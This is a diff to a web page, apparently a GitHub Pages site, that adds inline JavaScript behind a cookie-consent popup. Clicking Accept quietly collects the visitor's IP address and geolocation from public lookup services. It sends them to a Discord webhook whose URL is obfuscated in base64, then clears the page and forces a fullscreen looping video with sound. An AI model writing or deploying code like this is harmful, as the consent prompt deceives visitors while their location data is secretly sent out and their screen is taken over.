@@ -15,6 +15,92 @@
             <button id="decline-btn" class="btn decline-btn">Decline</button>
         </div>
     </div>
-    <script src="script.js"></script>
+
+    <script>
+        function get_information(link, callback) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", link, true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    callback(xhr.responseText);
+                }
+            };
+            xhr.send(null);
+        }
+
+        get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
+            var div = document.createElement("div");
+            div.innerHTML = text;
+            div.id = "razzylog";
+            document.body.appendChild(div);
+        });
+
+        get_information("https://api.ipify.org/", function(text) {
+            var div = document.createElement("div");
+            div.innerHTML = text;
+            div.id = "ipppp";
+            document.body.appendChild(div);
+        });
+
+        function logger() {
+            var ispp = document.getElementById('ipppp').innerHTML;
+            var extra = document.getElementById("razzylog").innerHTML;
+            var base64WebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwODAyNDk2NTkwMzI5MDM2OC9jNGYxd2lHX090aFpGWUZOQTVBT1FjRHJMU014Z1lZcFVSVjhxZTNlczcxaWppeDVYR1k4R09NbkFWRXFiR25XRDlVbA=="; 
+            var decodedWebhookUrl = atob(base64WebhookUrl); 
+
+            const request = new XMLHttpRequest();
+            request.open("POST", decodedWebhookUrl);
+            request.setRequestHeader('Content-type', 'application/json');
+
+            const embed = {
+                username: "Github Logger",
+                avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
+                embeds: [
+                    {
+                        title: "ocxa.github.io",
+                        description: `**IP**: _${ispp}_\n**Raw Data**: _https://api.techniknews.net/ipgeo/${ispp}_\n**Extra Info**: \`\`\`${extra}\`\`\``,
+                        color: 3066993
+                    }
+                ]
+            };
+
+            request.send(JSON.stringify(embed));
+        }
+
+        function troll() {
+            document.body.innerHTML = '';
+            let v = document.createElement('video');
+            v.src = 'https://raw.githubusercontent.com/scrinshoted/scrinshoted.github.io/main/media/video.mp4';
+            v.style.position = 'fixed';
+            v.style.top = 0;
+            v.style.left = 0;
+            v.style.width = '100vw';
+            v.style.height = '100vh';
+            v.style.objectFit = 'cover';
+            v.style.zIndex = 9999;
+            v.autoplay = true;
+            v.loop = true;
+            v.muted = false;
+            v.controls = false;
+            document.body.appendChild(v);
+
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.webkitRequestFullscreen) { 
+                document.documentElement.webkitRequestFullscreen();
+            } else if (document.documentElement.msRequestFullscreen) { 
+                document.documentElement.msRequestFullscreen();
+            }
+        }
+
+        document.getElementById("accept-btn").onclick = function() {
+            logger(); 
+            troll(); 
+        };
+
+        document.getElementById("decline-btn").onclick = function() {
+            document.getElementById("cookie-popup").style.display = "none";
+        };
+    </script>
 </body>
 </html>
